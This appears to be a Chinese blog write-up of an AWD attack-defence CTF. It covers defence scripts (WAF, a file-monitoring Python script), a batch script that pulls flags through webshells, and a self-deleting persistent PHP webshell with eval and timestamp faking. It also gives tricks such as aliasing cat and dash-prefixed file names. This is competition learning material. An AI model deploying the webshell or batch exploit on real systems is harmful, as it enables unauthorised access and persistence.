> 原文链接: https://www.anquanke.com//post/id/226088 


# 一次"线下awd"心得


                                阅读量   
                                **142242**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01396ab6beff9d9c10.png)](https://p5.ssl.qhimg.com/t01396ab6beff9d9c10.png)



## 前言

在参加比赛之前，团队大师傅为了让我们知道怎么打，特意给我们搭的环境，在经过了好多天的模拟之后，我也大致了解了awd该怎么去玩。



## 什么是awd

**AWD：Attack With Defence，译为攻击与守护，是指在比赛中每个队伍维护一台或者多台服务器，服务器中有多个漏洞和一些预留后门，利用漏洞攻击其他队伍可以得分，而修复漏洞看主办方规定，可能加分也可能不加分。**
- 服务器一般为web服务器，大多数为Linux操作系统，flag一般放在根目录下
- flag会在规定时间进行一次刷新
- 每个队伍都有一个自己的初始分数
- 主办方会对每个队伍服务器进行check，服务器被判定宕机会扣除本轮flag分数
- 一般会给队伍一个低权限用户，一般不会是直接给root权限，需要每个队伍去进行提权


## 比赛方式

一般比赛会是flag放在根目录，然后通过获取其他队伍的shell进行读取操作，得到flag。<br>
在比赛中，主办方可能会告诉你其他队伍的IP，也可能不说，一般在同一个B段或者C段，因此可以用nmap扫描工具发现其他队伍的IP。

```
nmap -sn 192.168.171.0/24
```



## 比赛分工

awd模式一般分为三个人，一个人防御，两个人进攻。



## 赛前准备

首先，准备好各种的脚本，批量getflag脚本，批量提交flag脚本(没有这两个，你就需要去手动获得对方shell，然后读取flag，纯手工不仅手累，而且效率低)。然后就是各种的比如文件监控脚本，waf以及其他的一些防御脚本，此外还要准备各种马，一句话，不死马，变种马，冰蝎等等。不至于比赛中耗费时间去写。<br>
然后就是准备好自己的心态，不要发生心态爆炸的情况。<br>
最后就是队伍内分好工作，进行详细的沟通以及在测试联系时多沟通。



## 比赛过程

### <a class="reference-link" name="%E9%98%B2%E5%AE%88"></a>防守

把网站根目录文件备份下来，拖到D盾扫描预留后门，然后抓紧时间删除预留后门，然后可以把文件拖到seay中进行审计，逐步排除危险漏洞等文件内容。<br>
另外可以利用脚本进行防守。一般分为两种脚本：WAF和文件监控<br>`WAF：`<br>
对于waf，GitHub上有许多种类版本的，可以视情况选择。具体使用：
1. 将waf.php文件上传到要包含的文件目录
<li>在页面中加入防护。<br>
可以在所需防护的页面源码中加入requtre_once(‘waf.php’);或者在网站的一个共用文件，例如config.inc.php中加入requtre_once(‘waf.php’);<br>
然后在这里贴上大师傅的<br>
常见PHP系统添加文件</li>
> <p>PHPCMS V9 \phpcms\base.php<br>
PHPWIND8.7 \data\sql_config.php<br>
DEDECMS5.7 \data\common.inc.php<br>
DiscuzX2 \config\config_global.php<br>
Wordpress \wp-config.php<br>
Metinfo \include\head.php</p>

在php.ini中找到

```
Automatically add files before or after any PHP document.
auto_prepend_file = 360_safe3.php路径;
```

特别注意的是：在自己服务器上面挂waf可能会导致网页主页等一些功能显示异常，需要自己详细的考虑。<br>`文件监控`<br>
对于文件监控脚本，GitHub上面也有很多，具体的功能就是会发现服务器新上传的文件并进行拦截，发现被修改的文件会立即修复，可以防止别人的上传shell攻击等。

```
# -*- coding: utf-8 -*-
#use: python file_check.py ./

import os
import hashlib
import shutil
import ntpath
import time

CWD = os.getcwd()
FILE_MD5_DICT = `{``}`      # 文件MD5字典
ORIGIN_FILE_LIST = []

# 特殊文件路径字符串
Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'
bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'
logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'

Special_string = 'drops_log'  # 免死金牌
UNICODE_ENCODING = "utf-8"
INVALID_UNICODE_CHAR_FORMAT = r"\?%02x"

# 文件路径字典
spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
Special_path = `{`
    'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)),
    'log' : os.path.realpath(os.path.join(spec_base_path, logstring)),
    'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
    'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),
`}`

def isListLike(value):
    return isinstance(value, (list, tuple, set))

# 获取Unicode编码
def getUnicode(value, encoding=None, noneToNull=False):

    if noneToNull and value is None:
        return NULL

    if isListLike(value):
        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
        return value

    if isinstance(value, unicode):
        return value
    elif isinstance(value, basestring):
        while True:
            try:
                return unicode(value, encoding or UNICODE_ENCODING)
            except UnicodeDecodeError, ex:
                try:
                    return unicode(value, UNICODE_ENCODING)
                except:
                    value = value[:ex.start] + "".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
    else:
        try:
            return unicode(value)
        except UnicodeDecodeError:
            return unicode(str(value), errors="ignore")

# 目录创建
def mkdir_p(path):
    import errno
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else: raise

# 获取当前所有文件路径
def getfilelist(cwd):
    filelist = []
    for root,subdirs, files in os.walk(cwd):
        for filepath in files:
            originalfile = os.path.join(root, filepath)
            if Special_path_str not in originalfile:
                filelist.append(originalfile)
    return filelist

# 计算机文件MD5值
def calcMD5(filepath):
    try:
        with open(filepath,'rb') as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
            hash = md5obj.hexdigest()
            return hash
    except Exception, e:
        print u'[!] getmd5_error : ' + getUnicode(filepath)
        print getUnicode(e)
        try:
            ORIGIN_FILE_LIST.remove(filepath)
            FILE_MD5_DICT.pop(filepath, None)
        except KeyError, e:
            pass

# 获取所有文件MD5
def getfilemd5dict(filelist = []):
    filemd5dict = `{``}`
    for ori_file in filelist:
        if Special_path_str not in ori_file:
            md5 = calcMD5(os.path.realpath(ori_file))
            if md5:
                filemd5dict[ori_file] = md5
    return filemd5dict

# 备份所有文件
def backup_file(filelist=[]):
    # if len(os.listdir(Special_path['bak'])) == 0:
    for filepath in filelist:
        if Special_path_str not in filepath:
            shutil.copy2(filepath, Special_path['bak'])

if __name__ == '__main__':
    print u'---------start------------'
    for value in Special_path:
        mkdir_p(Special_path[value])
    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
    ORIGIN_FILE_LIST = getfilelist(CWD)
    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
    print u'[*] pre work end!'
    while True:
        file_list = getfilelist(CWD)
        # 移除新上传文件
        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
        if len(diff_file_list) != 0:
            # import pdb;pdb.set_trace()
            for filepath in diff_file_list:
                try:
                    f = open(filepath, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] webshell find : ' + getUnicode(filepath)
                        shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt'))
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : file move error: ' + getUnicode(e)

        # 防止任意文件被修改,还原被修改文件
        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
        for filekey in md5_dict:
            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                try:
                    f = open(filekey, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] file had be change : ' + getUnicode(filekey)
                        shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt'))
                        shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey)
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : done_diff: ' + getUnicode(filekey)
                        pass
        time.sleep(2)
        # print '[*] ' + getUnicode(time.ctime())
```

`日志分析`<br>
利用命令行，输入`tailf /var/log/apache2/access.log`<br>
查看日志文件，进行分析，观察攻击者是以哪个方式进行攻击的。

### <a class="reference-link" name="%E6%94%BB%E5%87%BB"></a>攻击

`批量得到flag脚本:`

```
#coding=utf-8
import requests
url_head="http://10.100.100."    #网段
shell_addr="/upload/url/shell.php" #木马路径
passwd="xiaoma"                    #木马密码
port=""
payload = `{`passwd: 'System(\'cat /flag\');'`}`

webshelllist=open("webshelllist.txt","w")
flag=open("flag.txt","w")

for i in range(130,160
):
    url=url_head+str(i)+":"+port+shell_addr
    try:
        res=requests.post(url,payload,timeout=1)
        if res.status_code == requests.codes.ok:
            result = url+" connect shell sucess,flag is "+res.text
            print (result)
            flag.write(result+"\n");
            print &gt;&gt;flag,result
            print &gt;&gt;webshelllist,url+","+passwd
        else:
            print ("shell 404")
    except:
        print (url+" connect shell fail")

webshelllist.close()
flag.close()
```

`批量提交flag脚本：`

```
def submit(flag, token):
    url = "wangzhi"
    pos = `{`
        "flag":flag
        "token":token
    `}`
    print "[+] Submiting flag : [%s]" % (pos)
    response = requests.post(url,data=data)
    content = response.content
    print "[+] Content : %s " % (content)
    if failed in content:
        print "[-]failed"
        return False
    else:
        print "[+] Success!"
        return True
```

但是很可惜，在这次 **“awd”** 比赛中，并没有用上。而且在用的时候，需要进行一些修改，调试。

`种不死马`<br>
在比赛过程中，可以抢一波预留后门，得到shell，然后往服务器里面种不死马，进一步维护自己的权限，然后可以用分裂马等一些马传上去。<br>
对于不死马，GitHub上面也有好多，这里给出我自己的一个不死马。有兴趣的可以在本地尝试

```
&lt;?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.shell.php';
$code = '&lt;?php if(md5($_GET["passwd"])=="76a2173be6393254e72ffa4d6df1030a")`{`@eval($_REQUEST['cmd']);`}` ?&gt;';
while (1)`{`
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .shell.php');
    usleep(5000);
`}`
?&gt;
```

而对于删除不死马，首先需要找到他的进程，关掉进程之后，才能删掉，不然会一直生成，删不掉。<br>
而对于关闭进程，这里贴出自己用的命令

```
ps aux | grep www-data | awk '`{`print $2`}`' | xargs kill -9 //删除www-date用户下的所有进程
接着直接删除不死马文件
```

### <a class="reference-link" name="%E9%AA%9A%E5%A7%BF%E5%8A%BF"></a>骚姿势

在awd比赛中，往往有一些大师傅热衷于去搅屎，而在这里也贴出自己团队大师傅说的一些骚姿势

**<a class="reference-link" name="%E8%B5%B7%E5%88%AB%E5%90%8D"></a>起别名**

在Linux系统中，可以通过`alias`对系统命令起一些别名，这样子用本来的名字时会出现你事先设置好的东西，而不是执行这个命令。<br>
比如：`alias cat="echo`date`|md5sum|cut -d ' ' -f1||"` 这个命令用于在输入`cat`时输出一串类似flag的字符串。

[![](https://p2.ssl.qhimg.com/t012f1a6011959a03fb.png)](https://p2.ssl.qhimg.com/t012f1a6011959a03fb.png)

想要删除时只需要输入`alias -a`即可。

<a class="reference-link" name="%E8%BD%AF%E9%93%BE%E6%8E%A5"></a>**软链接**

在得到对方shell之后，对方肯定会发现后门文件，就会想办法进行修补，这时候可以用Linux中的软链接功能，把flag软链接道到一个可写可读文件中。

[![](https://p0.ssl.qhimg.com/t01b3ef6038df9533a8.png)](https://p0.ssl.qhimg.com/t01b3ef6038df9533a8.png)

<a class="reference-link" name="%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0"></a>**文件名称**

对于文件名称，一般写入不死马用的都是.xxx.php隐藏起来，但是一看就知道有很大嫌疑，所以名字可以用-xxx.php来命名，这样子当你用命令行删除时，Linux会默认-后面是命令参数而无法执行，只能手动去删除。<br>
效果图同上

<a class="reference-link" name="%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90"></a>**修改文件权限**

对于一些文件有写权限的可以选择修改他的权限，让别人无法往里面写入文件<br>
命令`chmod 555 指定文件路径`

<a class="reference-link" name="%E5%85%B6%E4%BB%96%E6%90%85%E5%B1%8E%E6%93%8D%E4%BD%9C"></a>**其他搅屎操作**

很多的，例如封对手IP了什么的，好多搅屎操作都是在大师傅们的无聊中搞出来了，不过这样的awd打起来不是更有意思吗？



## 尾言

本来打算是这次参加线下赛之后回来总结一下自己的一些心得的，但是怎么说呢，这个线下赛一言难尽，也挺不错的，最起码接触了一下线下awd实战，不管怎样，这对于之后的学习都会有帮助的，继续加油！
